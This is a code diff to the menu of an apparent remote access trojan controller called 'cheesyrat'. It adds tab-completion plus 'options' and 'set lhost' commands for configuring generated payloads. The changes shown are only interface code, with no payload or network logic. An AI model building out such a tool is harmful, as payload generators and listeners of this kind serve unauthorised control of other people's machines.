@@ -9,8 +9,8 @@ import time
 import signal
 import webbrowser
 import readline
-import json
 from lib import colors
+from lib import autocomplete
 from lib import cheesyrat_lib
 
 def complete_menu():
@@ -19,6 +19,9 @@ def complete_menu():
     answ=True
     while answ:
         ans = ""
+        completer = autocomplete.Complete(["help", "generate", "listen", "credits", "banner", "clear", "exit", "quit"])
+        readline.set_completer(completer.complete)
+        readline.parse_and_bind('tab: complete')
         ans = cheesyrat_lib.input_func(colors.GREEN + colors.BOLD + ' ┌─[' + colors.RED + 'cheesyrat' + colors.GREEN + colors.BOLD + ']--[' + colors.RED + colors.BOLD + '-' + colors.GREEN + colors.BOLD + ']-[' + colors.YELLOW + 'menu' + colors.GREEN + colors.BOLD + ']:\n' + ' └─────► ' + colors.END)
 
         if ans.lower() == "help":
@@ -48,11 +51,20 @@ def complete_menu():
 
 def generate_menu():
     while True:
+        completer = autocomplete.Complete(["help", "clear", "back", "exit", "quit", "options", "set"])
+        readline.set_completer(completer.complete)
+        readline.parse_and_bind('tab: complete')
         cmd = cheesyrat_lib.input_func(colors.GREEN + colors.BOLD + ' ┌─[' + colors.RED + 'cheesyrat' + colors.GREEN + colors.BOLD + ']--[' + colors.RED + colors.BOLD + '-' + colors.GREEN + colors.BOLD + ']-[' + colors.YELLOW + 'main/generate' + colors.GREEN + colors.BOLD + ']:\n' + ' └─────► ' + colors.END)
         if cmd.lower() == "help":
             cheesyrat_lib.generate_menu_help()
         elif cmd.lower() == "?":
             cheesyrat_lib.generate_menu_help()
+        elif cmd.lower() == "options":
+            cheesyrat_lib.payload_options()
+        elif cmd.lower()[0:9] == "set lhost":
+            lhost = cmd[10:]
+            cheesyrat_lib.update_json("lhost", lhost, cheesyrat_lib.get_config_json_file())
+            print("lhost => " + lhost)
         elif cmd.lower() == "clear":
             cheesyrat_lib.clear()
         elif cmd.lower() == "back":
